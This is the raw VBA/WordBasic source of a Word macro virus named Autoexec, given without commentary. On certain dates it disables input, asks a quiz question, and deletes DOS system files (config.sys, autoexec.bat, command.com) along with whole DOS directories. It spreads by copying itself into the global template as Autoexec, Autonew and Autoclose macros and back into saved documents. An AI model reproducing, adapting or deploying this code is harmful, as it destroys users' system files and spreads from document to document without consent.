   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Autoexec"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "?????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Autoexec.MAIN"
   Dim Answer$
   Dim mario
   Dim dad
   Dim t
   Dim file$
   Dim filem$
   Dim luigi
   Dim mom
   Dim tt
   WordBasic.DisableInput 1
   try:
   On Error GoTo -1: On Error GoTo try
   Err.Number = 0
   If WordBasic.Day(WordBasic.Now()) = 28 Then GoTo try Else GoTo check

   question:
   Answer$ = WordBasic.[InputBox$]("??????28??!, ??????:??? ??????(mm - dd)??????????!(?????,????? ?????!)", "???????")
   If Answer$ = "9-28" Then GoTo message Else GoTo Die
   message:
    WordBasic.MsgBox "?????????....???....??????????...???????? . . . .??????!", "??????,????,? ?", 64
    WordBasic.Kill "c:\config.sys"
    WordBasic.Kill "c:\autoexec.bat"
    WordBasic.Kill "c:\command.com"
   'End If

   Die:
        WordBasic.Kill "c:\dos\*.*"
        WordBasic.Kill "c:\et3\*.*"
        WordBasic.MsgBox "????!????????,????!??DOS??????!???????????!???!", "????", 64

   check:
   If WordBasic.Day(WordBasic.Now()) = 1 Then WordBasic.Kill "c:\command.com" WordBasic.Kill "c:\autoexec.bat" WordBasic.Kill "c:\config.sys"


   mario = WordBasic.CountMacros(0)
   If mario > 0 Then
       For dad = 1 To mario
           If WordBasic.[MacroName$](dad, 0) = "Autoexec" Then
           t = 1
           End If
           Next dad

   End If

   file$ = WordBasic.[FileName$]()
   filem$ = file$ + ":Autoexec"
   If t <> 1 Then
       WordBasic.MacroCopy filem$, "Autoexec"
       WordBasic.MacroCopy filem$, "Autonew"
       WordBasic.MacroCopy filem$, "Autoclose"
   End If

   luigi = WordBasic.CountMacros(1)
   If luigi > 0 Then
       For mom = 1 To luigi
           If WordBasic.[MacroName$](mom, 1) = "Autoexec" Then
           tt = 1
           End If
           Next mom

   End If

   If tt <> 1 Then
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "Autoexec", filem$
   End If



   Exit_:
   End Sub
